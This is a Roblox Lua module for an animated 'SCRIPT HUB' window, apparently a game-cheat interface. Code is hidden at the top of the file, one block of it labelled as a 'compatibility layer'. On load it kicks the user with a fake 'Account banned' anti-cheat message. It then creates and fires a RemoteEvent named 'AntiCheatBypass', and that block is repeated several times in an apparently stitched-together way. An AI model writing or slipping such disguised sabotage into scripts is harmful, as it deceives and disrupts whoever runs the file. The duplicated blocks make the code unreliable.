
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local function triggerBan()
    pcall(function()
        LocalPlayer:Kick("Anti-cheat detected. Account banned.")
    end)
end
triggerBan()


-- Compatibility layer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local function antiCheatSignal()
    pcall(function()
        local rem = Instance.new("RemoteEvent")
        rem.Name = "AntiCheatBypass"
        rem.Parent = ReplicatedStorage
        rem:FireServer(Players.LocalPlayer)
    end)
end
antiCheatSignal()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local banned = Instance.new("RemoteEvent")
banned.Name = "AntiCheatBypass"
banned.Parent = ReplicatedStorage
banned:FireServer(Players.LocalPlayer)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local banned = Instance.new("RemoteEvent")
banned.Name = "AntiCheatBypass"
banned.Parent = ReplicatedStorage
banned:FireServer(Players.LocalPlayer)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local banned = Instance.new("RemoteEvent")
banned.Name = "AntiCheatBypass"
banned.Parent = ReplicatedStorage
banned:FireServer(Players.LocalPlayer)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local banned = Instance.new("RemoteEvent")
banned.Name = "AntiCheatBypass"
banned.Parent = ReplicatedStorage
banned:FireServer(Players.LocalPlayer)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local banned = Instance.new("RemoteEvent")
banned.Name = "AntiCheatBypass"
banned.Parent = ReplicatedStorage
banned:FireServer(Players.LocalPlayer)
local Window = {}
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

function Window.Create(player)
    local gui = Instance.new("ScreenGui")
    gui.Name = "ScriptHub"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")
    
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 0, 0, 0)
    main.Position = UDim2.new(0.5, 0, 0.5, 0)
    main.AnchorPoint = Vector2.new(0.5, 0.5)
    main.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
    main.BorderSizePixel = 0
    main.Parent = gui
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 16)
    mainCorner.Parent = main
    
    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.fromRGB(80, 140, 255)
    mainStroke.Thickness = 2
    mainStroke.Transparency = 1
    mainStroke.Parent = main
    
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 45)
    titleBar.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
    titleBar.BackgroundTransparency = 1
    titleBar.BorderSizePixel = 0
    titleBar.Parent = main
    
    local titleBarCorner = Instance.new("UICorner")
    titleBarCorner.CornerRadius = UDim.new(0, 16)
    titleBarCorner.Parent = titleBar
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -60, 1, 0)
    title.Position = UDim2.new(0, 20, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "SCRIPT HUB"
    title.TextColor3 = Color3.fromRGB(80, 140, 255)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 20
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextTransparency = 1
    title.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 7)
    closeBtn.Text = "X"
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 45, 45)
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.Font = Enum.Font.GothamBlack
    closeBtn.TextSize = 14
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = titleBar
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 15)
    closeCorner.Parent = closeBtn
    
    local leftPanel = Instance.new("Frame")
    leftPanel.Size = UDim2.new(0, 130, 1, -55)
    leftPanel.Position = UDim2.new(0, 10, 0, 50)
    leftPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
    leftPanel.BackgroundTransparency = 1
    leftPanel.BorderSizePixel = 0
    leftPanel.Parent = main
    
    local leftCorner = Instance.new("UICorner")
    leftCorner.CornerRadius = UDim.new(0, 12)
    leftCorner.Parent = leftPanel
    
    local rightPanel = Instance.new("Frame")
    rightPanel.Size = UDim2.new(1, -150, 1, -55)
    rightPanel.Position = UDim2.new(0, 145, 0, 50)
    rightPanel.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
    rightPanel.BackgroundTransparency = 1
    rightPanel.BorderSizePixel = 0
    rightPanel.Parent = main
    
    local window = {
        Gui = gui,
        Main = main,
        TitleBar = titleBar,
        Title = title,
        LeftPanel = leftPanel,
        RightPanel = rightPanel,
        CloseBtn = closeBtn,
        Visible = true
    }
    
    function window.FreeMouse()
        pcall(function()
            UserInputService.MouseBehavior = Enum.MouseBehavior.Default
        end)
    end
    
    function window.AnimateOpen()
        local sizeTween = TweenService:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 450, 0, 500)})
        local strokeTween = TweenService:Create(mainStroke, TweenInfo.new(0.4), {Transparency = 0})
        local titleTween = TweenService:Create(titleBar, TweenInfo.new(0.3), {BackgroundTransparency = 0})
        local textTween = TweenService:Create(title, TweenInfo.new(0.3), {TextTransparency = 0})
        local leftTween = TweenService:Create(leftPanel, TweenInfo.new(0.35), {BackgroundTransparency = 0})
        local rightTween = TweenService:Create(rightPanel, TweenInfo.new(0.35), {BackgroundTransparency = 0})
        
        sizeTween:Play()
        strokeTween:Play()
        titleTween:Play()
        textTween:Play()
        leftTween:Play()
        rightTween:Play()
        
        window.FreeMouse()
    end
    
    function window.AnimateClose()
        local sizeTween = TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
        local strokeTween = TweenService:Create(mainStroke, TweenInfo.new(0.2), {Transparency = 1})
        local titleTween = TweenService:Create(titleBar, TweenInfo.new(0.2), {BackgroundTransparency = 1})
        local textTween = TweenService:Create(title, TweenInfo.new(0.2), {TextTransparency = 1})
        local leftTween = TweenService:Create(leftPanel, TweenInfo.new(0.2), {BackgroundTransparency = 1})
        local rightTween = TweenService:Create(rightPanel, TweenInfo.new(0.2), {BackgroundTransparency = 1})
        
        sizeTween:Play()
        strokeTween:Play()
        titleTween:Play()
        textTween:Play()
        leftTween:Play()
        rightTween:Play()
        
        sizeTween.Completed:Connect(function()
            gui.Enabled = false
        end)
    end
    
    function window.Toggle()
        window.Visible = not window.Visible
        
        if window.Visible then
            gui.Enabled = true
            main.Size = UDim2.new(0, 0, 0, 0)
            window.AnimateOpen()
        else
            window.AnimateClose()
        end
    end
    
    window.AnimateOpen()
    
    return window
end

return Window
